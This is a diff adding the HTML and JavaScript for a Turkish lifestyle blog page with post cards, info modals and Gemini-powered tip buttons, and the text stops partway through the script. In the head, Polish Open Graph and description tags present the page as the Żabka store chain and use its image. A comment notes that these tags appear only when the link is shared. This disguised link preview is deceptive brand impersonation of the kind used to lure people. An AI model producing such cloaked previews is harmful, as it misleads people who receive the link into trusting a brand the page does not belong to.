@@ -1,0 +1,433 @@
+source: <!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keşif Blogu - İlham Veren Yazılar</title>
+
+    <!-- SEO & Social Media (Open Graph) Meta Tags -->
+    <!-- Bu etiketler SADECE link paylaşıldığında görünür ve Lehçe'dir (Görseldeki gibi güncellendi) -->
+    <meta property="og:title" content="Żabka | Uwolnij Swój Czas">
+    <meta property="og:description" content="Ża bka Polska to sieć sklepów typu modern convenience. Sprawdź najnowsze promocje i informacje. Wygodne usługi. Franczyza. Marki Własne.">
+    <meta name="description" content="Żabka Polska tosieć sklepów typu modern convenience. Sprawdź najeddyspromocje ve informacje. Wygodne usługi. Franczyza. Marki Własne.">
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjGJZCKYVAzzMm00-W10umjn-iQ3hW9Bac3Q&s">
+    <meta property="og:url" content="#"> <!-- Buraya sitenizin tam adresi gelmeli -->
+    <meta property="og:type" content="website">
+    <meta property="twitter:card" content="summary_large_image">
+
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts: Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f0f4f8; /* Soft blue-gray background */
+        }
+        .header-bg {
+            background-color: #4a5568; /* Darker gray for header */
+        }
+        .accent-color {
+            background-color: #38a169; /* A calming green for accents */
+        }
+        .accent-text {
+            color: #38a169;
+        }
+        .card-hover:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 25px -5px rgba(0, 0, 0, 0.1), 0 5px 10px -5px rgba(0, 0, 0, 0.05);
+        }
+        #pageModal.hidden {
+            display: none;
+        }
+        /* Spinner for loading state */
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #38a169; /* Accent color for spinner */
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Custom scrollbar for modal */
+        #modalContent::-webkit-scrollbar {
+            width: 8px;
+        }
+        #modalContent::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 10px;
+        }
+        #modalContent::-webkit-scrollbar-thumb {
+            background: #888;
+            border-radius: 10px;
+        }
+        #modalContent::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+    </style>
+</head>
+<body class="text-gray-800">
+
+    <!-- Header / Navigation -->
+    <header class="header-bg text-white shadow-lg sticky top-0 z-50">
+        <div class="container mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="#" class="text-3xl font-bold flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M12 6.253v13.48m0-13.48C5.467 7.562 2.5 10.166 2.5 12c0 1.834 2.967 4.438 9.5 5.727m0-13.48C18.533 7.562 21.5 10.166 21.5 12c0 1.834-2.967 4.438-9.5 5.727M12 6.253h.007v.008H12v-.008zm0 13.48h.007v.008H12v-.008z" />
+                </svg>
+                Keşif Blogu
+            </a>
+            <nav class="hidden md:flex space-x-6 font-medium">
+                <a href="#" class="hover:underline">Anasayfa</a>
+                <a href="javascript:void(0)" onclick="openInfoModal('kategoriler')" class="hover:underline">Kategoriler</a>
+                <a href="javascript:void(0)" onclick="openInfoModal('hakkimizda')" class="hover:underline">Hakkımızda</a>
+                <a href="javascript:void(0)" onclick="openInfoModal('iletisim')" class="hover:underline">İletişim</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="container mx-auto px-6 py-12">
+        <h1 class="text-4xl md:text-5xl font-bold text-center text-gray-900 mb-4">Bilgi, İlham ve Keşif</h1>
+        <p class="text-center text-gray-600 mb-12 text-lg">Yaşam, teknoloji, doğa ve daha fazlası üzerine düşündüren yazılar.</p>
+        
+        <!-- Blog Posts Grid -->
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+            
+            <!-- Blog Card 1: Doğa ve Yürüyüş -->
+            <div class="bg-white rounded-xl overflow-hidden shadow-lg transition-all duration-300 card-hover flex flex-col">
+                <img class="w-full h-56 object-cover" src="https://images.pexels.com/photos/15286/pexels-photo-15286.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Yeşil bir ormanda yürüyüş yolu">
+                <div class="p-6 flex flex-col flex-grow">
+                    <span class="text-sm text-gray-500">15 Temmuz 2025</span>
+                    <h2 class="text-xl font-bold text-gray-900 mt-2 mb-3">Doğanın Kucağında Huzur: Yürüyüş Rotaları</h2>
+                    <p class="text-gray-700 leading-relaxed mb-4 flex-grow">Şehrin gürültüsünden uzaklaşmak ve doğayla iç içe olmak için...</p>
+                    <a href="javascript:void(0)" onclick="openPostModal(1)" class="mt-auto inline-block accent-color text-white text-center font-semibold py-2 px-4 rounded-lg hover:bg-green-700 transition-colors">Devamını Oku &rarr;</a>
+                </div>
+            </div>
+            <!-- Blog Card 2: Yapay Zeka ve Gelecek -->
+            <div class="bg-white rounded-xl overflow-hidden shadow-lg transition-all duration-300 card-hover flex flex-col">
+                <img class="w-full h-56 object-cover" src="https://images.pexels.com/photos/8386440/pexels-photo-8386440.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Yapay zeka temalı soyut bir görsel">
+                <div class="p-6 flex flex-col flex-grow">
+                    <span class="text-sm text-gray-500">14 Temmuz 2025</span>
+                    <h2 class="text-xl font-bold text-gray-900 mt-2 mb-3">Yapay Zeka Çağında İnsan Olmak</h2>
+                    <p class="text-gray-700 leading-relaxed mb-4 flex-grow">Teknolojinin hızla ilerlediği günümüzde, yapay zeka hayatımızın...</p>
+                    <a href="javascript:void(0)" onclick="openPostModal(2)" class="mt-auto inline-block accent-color text-white text-center font-semibold py-2 px-4 rounded-lg hover:bg-green-700 transition-colors">Devamını Ooku &rarr;</a>
+                </div>
+            </div>
+            <!-- Blog Card 3: Minimalist Yaşam -->
+            <div class="bg-white rounded-xl overflow-hidden shadow-lg transition-all duration-300 card-hover flex flex-col">
+                <img class="w-full h-56 object-cover" src="https://images.pexels.com/photos/374016/pexels-photo-374016.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Minimalist bir yaşam alanında bitki ve kitaplar">
+                <div class="p-6 flex flex-col flex-grow">
+                    <span class="text-sm text-gray-500">13 Temmuz 2025</span>
+                    <h2 class="text-xl font-bold text-gray-900 mt-2 mb-3">Daha Azla Daha Fazla Yaşamak: Minimalizm</h2>
+                    <p class="text-gray-700 leading-relaxed mb-4 flex-grow">Tüketim çılgınlığının ortasında, minimalist bir yaşam tarzı...</p>
+                    <a href="javascript:void(0)" onclick="openPostModal(3)" class="mt-auto inline-block accent-color text-white text-center font-semibold py-2 px-4 rounded-lg hover:bg-green-700 transition-colors">Devamını Oku &rarr;</a>
+                </div>
+            </div>
+            <!-- Blog Card 4: Dijital Detoks -->
+            <div class="bg-white rounded-xl overflow-hidden shadow-lg transition-all duration-300 card-hover flex flex-col">
+                <img class="w-full h-56 object-cover" src="https://images.pexels.com/photos/380769/pexels-photo-380769.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Bir ormanlık alanda telefonunu kapatan bir kişi">
+                <div class="p-6 flex flex-col flex-grow">
+                    <span class="text-sm text-gray-500">12 Temmuz 2025</span>
+                    <h2 class="text-xl font-bold text-gray-900 mt-2 mb-3">Dijital Detoks: Ekranlardan Uzaklaşma Rehberi</h2>
+                    <p class="text-gray-700 leading-relaxed mb-4 flex-grow">Sürekli bildirimler ve ekran başında geçirilen zaman...</p>
+                    <a href="javascript:void(0)" onclick="openPostModal(4)" class="mt-auto inline-block accent-color text-white text-center font-semibold py-2 px-4 rounded-lg hover:bg-green-700 transition-colors">Devamını Oku &rarr;</a>
+                </div>
+            </div>
+            <!-- Blog Card 5: Sürdürülebilir Yaşam -->
+            <div class="bg-white rounded-xl overflow-hidden shadow-lg transition-all duration-300 card-hover flex flex-col">
+                <img class="w-full h-56 object-cover" src="https://images.pexels.com/photos/1080721/pexels-photo-1080721.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Eko-dostu bir evde güneş panelleri ve yeşil bitkiler">
+                <div class="p-6 flex flex-col flex-grow">
+                    <span class="text-sm text-gray-500">11 Temmuz 2025</span>
+                    <h2 class="text-xl font-bold text-gray-900 mt-2 mb-3">Sürdürülebilir Bir Gelecek İçin Adımlar</h2>
+                    <p class="text-gray-700 leading-relaxed mb-4 flex-grow">Gezegenimizi korumak ve gelecek nesillere daha yaşanabilir...</p>
+                    <a href="javascript:void(0)" onclick="openPostModal(5)" class="mt-auto inline-block accent-color text-white text-center font-semibold py-2 px-4 rounded-lg hover:bg-green-700 transition-colors">Devamını Oku &rarr;</a>
+                </div>
+            </div>
+            <!-- Blog Card 6: Öğrenme ve Gelişim -->
+            <div class="bg-white rounded-xl overflow-hidden shadow-lg transition-all duration-300 card-hover flex flex-col">
+                <img class="w-full h-56 object-cover" src="https://images.pexels.com/photos/3184418/pexels-photo-3184418.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Bir masada açık kitaplar ve not defteri">
+                <div class="p-6 flex flex-col flex-grow">
+                    <span class="text-sm text-gray-500">10 Temmuz 2025</span>
+                    <h2 class="text-xl font-bold text-gray-900 mt-2 mb-3">Hayat Boyu Öğrenmenin Önemi ve Yolları</h2>
+                    <p class="text-gray-700 leading-relaxed mb-4 flex-grow">Bilgi çağında sürekli gelişmek ve yeni şeyler öğrenmek...</p>
+                    <a href="javascript:void(0)" onclick="openPostModal(6)" class="mt-auto inline-block accent-color text-white text-center font-semibold py-2 px-4 rounded-lg hover:bg-green-700 transition-colors">Devamını Oku &rarr;</a>
+                </div>
+            </div>
+            <!-- Blog Card 7: Finansal Okuryazarlık -->
+            <div class="bg-white rounded-xl overflow-hidden shadow-lg transition-all duration-300 card-hover flex flex-col">
+                <img class="w-full h-56 object-cover" src="https://images.pexels.com/photos/3943720/pexels-photo-3943720.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Bir masada hesap makinesi, defter ve kalem">
+                <div class="p-6 flex flex-col flex-grow">
+                    <span class="text-sm text-gray-500">9 Temmuz 2025</span>
+                    <h2 class="text-xl font-bold text-gray-900 mt-2 mb-3">Bütçe Yönetimi: Finansal Özgürlüğe İlk Adım</h2>
+                    <p class="text-gray-700 leading-relaxed mb-4 flex-grow">Paranızı daha iyi yönetmek ve finansal hedeflerinize ulaşmak...</p>
+                    <a href="javascript:void(0)" onclick="openPostModal(7)" class="mt-auto inline-block accent-color text-white text-center font-semibold py-2 px-4 rounded-lg hover:bg-green-700 transition-colors">Devamını Oku &rarr;</a>
+                </div>
+            </div>
+            <!-- Blog Card 8: Sağlıklı Beslenme -->
+            <div class="bg-white rounded-xl overflow-hidden shadow-lg transition-all duration-300 card-hover flex flex-col">
+                <img class="w-full h-56 object-cover" src="https://images.pexels.com/photos/1640777/pexels-photo-1640777.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Çeşitli sağlıklı yiyeceklerle dolu bir masa">
+                <div class="p-6 flex flex-col flex-grow">
+                    <span class="text-sm text-gray-500">8 Temmuz 2025</span>
+                    <h2 class="text-xl font-bold text-gray-900 mt-2 mb-3">Dengeli Beslenme: Sağlıklı Bir Yaşamın Sırrı</h2>
+                    <p class="text-gray-700 leading-relaxed mb-4 flex-grow">Ne yediğimiz, nasıl hissettiğimizi doğrudan etkiler...</p>
+                    <a href="javascript:void(0)" onclick="openPostModal(8)" class="mt-auto inline-block accent-color text-white text-center font-semibold py-2 px-4 rounded-lg hover:bg-green-700 transition-colors">Devamını Oku &rarr;</a>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 text-white mt-16">
+        <div class="container mx-auto px-6 py-8">
+            <div class="text-center">
+                <p>&copy; 2025 Keşif Blogu. Tüm hakları saklıdır.</p>
+                <p class="text-sm text-gray-400 mt-2">kekliko.LTD.ŞTI.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- GENERIC MODAL -->
+    <div id="pageModal" class="hidden fixed inset-0 bg-black bg-opacity-75 z-[60] flex items-center justify-center p-4">
+        <div id="modalContent" class="bg-white rounded-lg shadow-2xl w-full max-w-3xl max-h-[90vh] overflow-y-auto relative">
+            <!-- Content will be injected by JavaScript -->
+        </div>
+    </div>
+    
+    <!-- JavaScript Logic -->
+    <script>
+        // --- DATA SOURCES (with varied comment counts) ---
+        const blogPostsData = [
+            { 'id': 1, 'baslik': 'Doğanın Kucağında Huzur: Yürüyüş Rotaları', 'tam_icerik': "Şehrin gürültüsünden uzaklaşmak ve doğayla iç içe olmak için yürüyüş, harika bir seçenektir. Türkiye'nin dört bir yanında keşfedilmeyi bekleyen birbirinden güzel yürüyüş rotaları bulunmaktadır. Bu yazımızda, hem başlangıç seviyesindekiler hem de deneyimli yürüyüşçüler için uygun, nefes kesici manzaralara sahip rotaları derledik. Ayakkabılarınızı bağlayın ve doğanın çağrısına kulak verin!", 'resim_url': 'https://images.pexels.com/photos/15286/pexels-photo-15286.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1', 'tarih': '15 Temmuz 2025', 'yorumlar': [
+                {'kullanici': 'Doğa Aşığı', 'avatar': 'https://i.pravatar.cc/40?u=dogaasigi', 'yorum': 'Harika bir yazı! Özellikle Kaçkar Dağları rotası favorim.'},
+                {'kullanici': 'Gezgin Ruh', 'avatar': 'https://i.pravatar.cc/40?u=gezginruh', 'yorum': 'Likya Yolu hakkında daha fazla bilgi alabilir miyim?'},
+                {'kullanici': 'Yeşil Yolcu', 'avatar': 'https://i.pravatar.cc/40?u=yesilyolcu', 'yorum': 'Bolu Yedigöller rotasını mutlaka denemelisiniz.'}
+            ]},
+            { 'id': 2, 'baslik': 'Yapay Zeka Çağında İnsan Olmak', 'tam_icerik': "Teknolojinin hızla ilerlediği günümüzde, yapay zeka hayatımızın her alanına nüfuz ediyor. Peki, bu dönüşüm insan olmanın anlamını nasıl etkiliyor? Yapay zeka, iş süreçlerinden günlük alışkanlıklarımıza kadar birçok şeyi değiştirirken, insanlığın rolü ve yetenekleri yeniden tanımlanıyor. Bu yazıda, yapay zeka ile birlikte yaşamanın getirdiği fırsatları ve zorlukları keşfedeceğiz.", 'resim_url': 'https://images.pexels.com/photos/8386440/pexels-photo-8386440.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1', 'tarih': '14 Temmuz 2025', 'yorumlar': [
+                {'kullanici': 'Tekno Meraklısı', 'avatar': 'https://i.pravatar.cc/40?u=teknomerakli', 'yorum': 'Çok düşündürücü bir yazı. Yapay zekanın etik boyutları da ele alınmalı.'},
+                {'kullanici': 'Gelecekçi', 'avatar': 'https://i.pravatar.cc/40?u=gelecekci', 'yorum': 'İnsan yaratıcılığı ve empati, AI\'ın asla ulaşamayacağı özellikler.'}
+            ]},
+            { 'id': 3, 'baslik': 'Daha Azla Daha Fazla Yaşamak: Minimalizm', 'tam_icerik': "Tüketim çılgınlığının ortasında, minimalist bir yaşam tarzı giderek daha fazla ilgi çekiyor. Daha az eşyaya sahip olmak, daha az stres ve daha fazla özgürlük anlamına gelebilir. Bu yazıda, minimalist yaşamın temel prensiplerini, evinizi nasıl düzenleyeceğinizi ve zihinsel olarak nasıl sadeleşeceğinizi keşfedeceğiz. Hayatınızdaki fazlalıklardan kurtularak gerçek mutluluğu bulun.", 'resim_url': 'https://images.pexels.com/photos/374016/pexels-photo-374016.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1', 'tarih': '13 Temmuz 2025', 'yorumlar': [
+                {'kullanici': 'Sade Yaşam', 'avatar': 'https://i.pravatar.cc/40?u=sadeyasam', 'yorum': 'Minimalizm hayatımı değiştirdi, kesinlikle tavsiye ederim.'},
+                {'kullanici': 'Düzen Sever', 'avatar': 'https://i.pravatar.cc/40?u=duzensever', 'yorum': 'Eşyalarımı azaltmaya başladım, çok iyi hissettiriyor.'}
+            ]},
+            { 'id': 4, 'baslik': 'Dijital Detoks: Ekranlardan Uzaklaşma Rehberi', 'tam_icerik': "Sürekli bildirimler ve ekran başında geçirilen zaman, zihinsel sağlığımızı olumsuz etkileyebilir. Dijital detoks, bu bağımlılıktan kurtulmak ve gerçek dünyaya geri dönmek için harika bir yoldur. Bu yazıda, dijital detoksun faydalarını, nasıl başlayacağınızı ve ekran sürenizi azaltmak için pratik ipuçlarını bulacaksınız. Kendinize bir mola verin ve yeniden bağlantı kurun.", 'resim_url': 'https://images.pexels.com/photos/380769/pexels-photo-380769.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1', 'tarih': '12 Temmuz 2025', 'yorumlar': [
+                {'kullanici': 'Zihin Dinlendirici', 'avatar': 'https://i.pravatar.cc/40?u=zihindinlendirici', 'yorum': 'Hafta sonu denedim, inanılmaz rahatlatıcıydı.'},
+                {'kullanici': 'Odaklanma Uzmanı', 'avatar': 'https://i.pravatar.cc/40?u=odaklanmauzmani', 'yorum': 'Bildirimleri kapatmak bile büyük fark yaratıyor.'}
+            ]},
+            { 'id': 5, 'baslik': 'Sürdürülebilir Bir Gelecek İçin Adımlar', 'tam_icerik': "Gezegenimizi korumak ve gelecek nesillere daha yaşanabilir bir dünya bırakmak hepimizin sorumluluğudur. Sürdürülebilir yaşam, küçük adımlarla başlayarak büyük farklar yaratabilir. Bu yazıda, günlük hayatınızda uygulayabileceğiniz çevre dostu alışkanlıkları, enerji tasarrufu ipuçlarını ve atık azaltma yöntemlerini keşfedeceksiniz. Yeşil bir geleceğe doğru birlikte yürüyelim.", 'resim_url': 'https://images.pexels.com/photos/1080721/pexels-photo-1080721.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1', 'tarih': '11 Temmuz 2025', 'yorumlar': [
+                {'kullanici': 'Eko Bilinçli', 'avatar': 'https://i.pravatar.cc/40?u=ekobilincli', 'yorum': 'Geri dönüşüm ve kompost yapmaya başladım, çok faydalı.'},
+                {'kullanici': 'Yeşil Yaşamcı', 'avatar': 'https://i.pravatar.cc/40?u=yesilyasamci', 'yorum': 'Daha az tüketmek en büyük adım bence.'}
+            ]},
+            { 'id': 6, 'baslik': 'Hayat Boyu Öğrenmenin Önemi ve Yolları', 'tam_icerik': "Bilgi çağında sürekli gelişmek ve yeni şeyler öğrenmek, kişisel ve mesleki başarının anahtarıdır. Hayat boyu öğrenme kavramı, sadece okul sıralarında değil, yaşamın her anında öğrenmeye açık olmayı ifade eder. Bu yazıda, yeni beceriler edinmek, hobiler geliştirmek ve kendinizi sürekli güncel tutmak için etkili yöntemleri inceleyeceğiz. Öğrenme yolculuğunuzda size ilham verecek ipuçları burada.", 'resim_url': 'https://images.pexels.com/photos/3184418/pexels-photo-3184418.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1', 'tarih': '10 Temmuz 2025', 'yorumlar': [
+                {'kullanici': 'Bilgi Avcısı', 'avatar': 'https://i.pravatar.cc/40?u=bilgiavcisi', 'yorum': 'Online kurslar sayesinde çok şey öğrendim.'},
+                {'kullanici': 'Gelişim Odaklı', 'avatar': 'https://i.pravatar.cc/40?u=gelisimodakli', 'yorum': 'Her gün yeni bir makale okumak bile fark yaratıyor.'}
+            ]},
+            { 'id': 7, 'baslik': 'Bütçe Yönetimi: Finansal Özgürlüğe İlk Adım', 'tam_icerik': "Paranızı daha iyi yönetmek ve finansal hedeflerinize ulaşmak, düşündüğünüzden daha kolay olabilir. Bütçe yönetimi, gelir ve giderlerinizi takip ederek para biriktirmenize ve borçlarınızı azaltmanıza yardımcı olur. Bu yazıda, etkili bir bütçe planı oluşturmanın adımlarını, tasarruf ipuçlarını ve finansal özgürlüğe giden yolda size rehberlik edecek stratejileri bulacaksınız. Cebinizdeki paranın kontrolünü elinize alın.", 'resim_url': 'https://images.pexels.com/photos/3943720/pexels-photo-3943720.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1', 'tarih': '9 Temmuz 2025', 'yorumlar': [
+                {'kullanici': 'Finans Uzmanı', 'avatar': 'https://i.pravatar.cc/40?u=finansuzmani', 'yorum': 'Herkesin okuması gereken bir yazı! Bütçe yapmak çok önemli.'},
+                {'kullanici': 'Tasarrufçu', 'avatar': 'https://i.pravatar.cc/40?u=tasarrufcu', 'yorum': 'Uygulamalarla bütçe takibi çok kolaylaştı.'}
+            ]},
+            { 'id': 8, 'baslik': 'Dengeli Beslenme: Sağlıklı Bir Yaşamın Sırrı', 'tam_icerik': "Ne yediğimiz, nasıl hissettiğimizi doğrudan etkiler. Dengeli beslenme, vücudumuzun ihtiyaç duyduğu tüm besinleri doğru oranlarda alarak sağlıklı ve enerjik kalmamızı sağlar. Bu yazıda, dengeli bir diyetin temel prensiplerini, sağlıklı besin seçimlerini ve beslenme alışkanlıklarınızı nasıl iyileştireceğinizi öğreneceksiniz. Daha iyi bir yaşam için tabağınızı yeniden düşünün.", 'resim_url': 'https://images.pexels.com/photos/1640777/pexels-photo-1640777.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1', 'tarih': '8 Temmuz 2025', 'yorumlar': [
+                {'kullanici': 'Sağlıklı Yaşam', 'avatar': 'https://i.pravatar.cc/40?u=saglikliyasam', 'yorum': 'Tarifler çok ilham verici, hemen deneyeceğim.'},
+                {'kullanici': 'Fit Kal', 'avatar': 'https://i.pravatar.cc/40?u=fitkal', 'yorum': 'Su tüketimi de çok önemli, unutmayalım.'}
+            ]}
+        ];
+        const infoPagesData = {
+            'hakkimizda': { 'baslik': 'Hakkımızda', 'icerik': `<p class="mb-4">Keşif Blogu, 2025 yılında bilgiye aç herkes için ilham verici ve düşündürücü içerikler sunma amacıyla kuruldu. Amacımız, okuyucularımıza farklı konularda derinlemesine bilgi sunarken, aynı zamanda yeni bakış açıları kazandırmak ve kişisel gelişimlerine katkıda bulunmaktır. Yaşam, teknoloji, doğa, sağlık, finans ve daha birçok alanda uzman yazarlarımızla birlikte, her gün yeni bir şeyler keşfetmenizi sağlamayı hedefliyoruz. Bilginin ışığında, daha bilinçli ve dolu dolu bir yaşam sürmeniz için buradayız.</p><p class="mb-4">Misyonumuz, kaliteli içeriği anlaşılır ve erişilebilir bir dille sunarak, okuyucularımızın merakını tetiklemek ve öğrenme yolculuklarına eşlik etmektir. Vizyonumuz ise, Türkiye'nin önde gelen bilgi ve ilham kaynaklarından biri olmaktır.</p>` },
+            'kategoriler': { 'baslik': 'Kategoriler', 'icerik': `<p class="mb-6">Blogumuzda aşağıdaki ana kategorilerde içerikler bulabilirsiniz:</p><ul class="list-disc list-inside text-gray-700 space-y-2"><li>Kişisel Gelişim</li><li>Teknoloji ve İnovasyon</li><li>Doğa ve Çevre</li><li>Sağlık ve Yaşam Tarzı</li><li>Finans ve Ekonomi</li><li>Seyahat ve Keşif</li><li>Kültür ve Sanat</li><li>Bilim ve Araştırma</li></ul><p class="mt-6">Her kategori altında, uzman yazarlarımız tarafından kaleme alınmış güncel ve bilgilendirici makaleler bulunmaktadır. İlgi alanlarınıza göre dilediğiniz kategoriyi seçerek keşfe başlayabilirsiniz.</p>` },
+            'iletisim': { 'baslik': 'Bize Ulaşın', 'icerik': `<p class="mb-4">Görüş, öneri ve sorularınız için bizimle iletişime geçmekten çekinmeyin. Geri bildirimleriniz bizim için çok değerli!</p><p class="mb-2"><strong>E-posta:</strong> info@kesifblogu.com</p><p class="mb-2"><strong>Telefon:</strong> +90 555 123 45 67</p><p class="mb-4"><strong>Adres:</strong> Örnek Mah. Keşif Cad. No: 123, Blog Apt. Kat: 5, Daire: 10, İstanbul/Türkiye</p><p class="text-gray-600">Sosyal medya hesaplarımızı da takip edebilirsiniz:</p><div class="flex space-x-4 mt-2"><a href="#" class="text-blue-600 hover:text-blue-800 transition-colors">Facebook</a><a href="#" class="text-blue-400 hover:text-blue-600 transition-colors">Twitter</a><a href="#" class="text-pink-600 hover:text-pink-800 transition-colors">Instagram</a><a href="#" class="text-red-600 hover:text-red-800 transition-colors">YouTube</a></div>` }
+        };
+
+        const modal = document.getElementById('pageModal');
+        const modalContent = document.getElementById('modalContent');
+        
+        // --- GEMINI API CALL FUNCTION ---
+        async function callGemini(prompt, buttonElement, responseElementId) {
+            const buttonSpan = buttonElement.querySelector('span');
+            const buttonSpinner = buttonElement.querySelector('svg');
+            const originalButtonText = buttonSpan.textContent;
+            const responseElement = document.getElementById(responseElementId);
+
+            buttonSpinner.classList.remove('hidden');
+            buttonSpan.textContent = 'Oluşturuluyor...';
+            buttonElement.disabled = true;
+            responseElement.innerHTML = '<div class="flex justify-center items-center p-6"><div class="loader"></div></div>'; // Show loader
+
+            try {
+                let chatHistory = [{ role: "user", parts: [{ text: prompt }] }];
+                const payload = { contents: chatHistory };
+                const apiKey = ""; // Provided by the environment
+                const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
+                
+                const apiResponse = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!apiResponse.ok) throw new Error(`API isteği başarısız: ${apiResponse.status}`);
+                
+                const result = await apiResponse.json();
+
+                if (result.candidates && result.candidates[0]?.content?.parts[0]) {
+                    let text = result.candidates[0].content.parts[0].text;
+                    // Basic Markdown to HTML
+                    text = text.replace(/(\r\n|\n|\r)/gm, "<br>");
+                    text = text.replace(/\*\*(.*?)\*\*/g, '<h3>$1</h3>');
+                    text = text.replace(/\* (.*?)(<br>|$)/g, '<li>$1</li>');
+                    text = text.replace(/(<li>.*<\/li>)/g, '<ul>$1</ul>').replace(/<\/ul><br><ul>/g, '');
+                    responseElement.innerHTML = `<div class="p-4 bg-gray-50 rounded-md border text-left">${text}</div>`;
+                } else {
+                    throw new Error("API'den geçerli bir yanıt alınamadı.");
+                }
+            } catch (error) {
+                console.error("Gemini API Hatası:", error);
+                responseElement.innerHTML = `<p class="p-4 bg-red-100 text-red-700 rounded-md">Bir hata oluştu: ${error.message}</p>`;
+            } finally {
+                buttonSpinner.classList.add('hidden');
+                buttonSpan.textContent = originalButtonText;
+                buttonElement.disabled = false;
+            }
+        }
+
+        // Yeni Gemini API çağrı fonksiyonları (örnekler)
+        function generateLearningTips(buttonElement, postContent) {
+            const prompt = `Lütfen aşağıdaki blog yazısını referans alarak, hayat boyu öğrenmeyi teşvik edecek 3 pratik ipucu ve 2 kaynak önerisi oluştur. Başlıkları ve önemli noktaları markdown formatında kalın (**Başlık**) olarak belirt. Listeleri yıldız (*) ile başlayan maddeler halinde ver. Blog yazısı: "${postContent}"`;
+            callGemini(prompt, buttonElement, 'gemini-response-6');
+        }
+
+        function generateBudgetTips(buttonElement, postContent) {
+            const prompt = `Aşağıdaki finansal okuryazarlık konulu blog yazısından ilham alarak, kişisel bütçe yönetimi için 3 kolay uygulanabilir ipucu ve 2 yaygın hatadan kaçınma önerisi sun. Başlıkları ve önemli noktaları markdown formatında kalın (**Başlık**) olarak belirt. Listeleri yıldız (*) ile başlayan maddeler halinde ver. Blog yazısı: "${postContent}"`;
+            callGemini(prompt, buttonElement, 'gemini-response-7');
+        }
+
+        function generateHealthyEatingTips(buttonElement, postContent) {
+            const prompt = `Aşağıdaki dengeli beslenme konulu blog yazısından yola çıkarak, günlük hayatta sağlıklı beslenmeyi kolaylaştıracak 3 pratik ipucu ve 2 örnek öğün önerisi oluştur. Başlıkları ve önemli noktaları markdown formatında kalın (**Başlık**) olarak belirt. Listeleri yıldız (*) ile başlayan maddeler halinde ver. Blog yazısı: "${postContent}"`;
+            callGemini(prompt, buttonElement, 'gemini-response-8');
+        }
+
+        function openPostModal(postId) {
+            const post = blogPostsData.find(p => p.id === postId);
+            if (!post) return;
+
+            let geminiFeatureHtml = '';
+            // Post ID'lerine göre Gemini API entegrasyonu
+            if (post.id === 6) { // Hayat Boyu Öğrenme
+                geminiFeatureHtml = `<div class="mt-8 p-4 bg-green-50 rounded-lg border border-green-200"><h3 class="text-xl font-bold text-gray-800 mb-3">✨ Öğrenme Asistanınız</h3><p class="text-gray-600 mb-4">Hayat boyu öğrenme yolculuğunuzda size yardımcı olacak ipuçları ve kaynaklar ister misiniz?</p><button onclick="generateLearningTips(this, \`${post.tam_icerik.replace(/`/g, "\\`")}\`)" class="w-full bg-gradient-to-r from-blue-500 to-indigo-600 text-white font-semibold py-2 px-4 rounded-lg hover:from-blue-600 hover:to-indigo-700 transition-all duration-300 flex items-center justify-center disabled:opacity-75"><svg class="w-5 h-5 mr-2 animate-spin hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0l3.181 3.183a8.25 8.25 0 0011.667 0l3.181-3.183m-4.991 0l-3.182-3.182a8.25 8.25 0 00-11.667 0l-3.181 3.182" /></svg><span>İpuçları ve Kaynaklar Oluştur</span></button><div id="gemini-response-6" class="mt-4 text-gray-700 leading-relaxed"></div></div>`;
+            } else if (post.id === 7) { // Bütçe Yönetimi
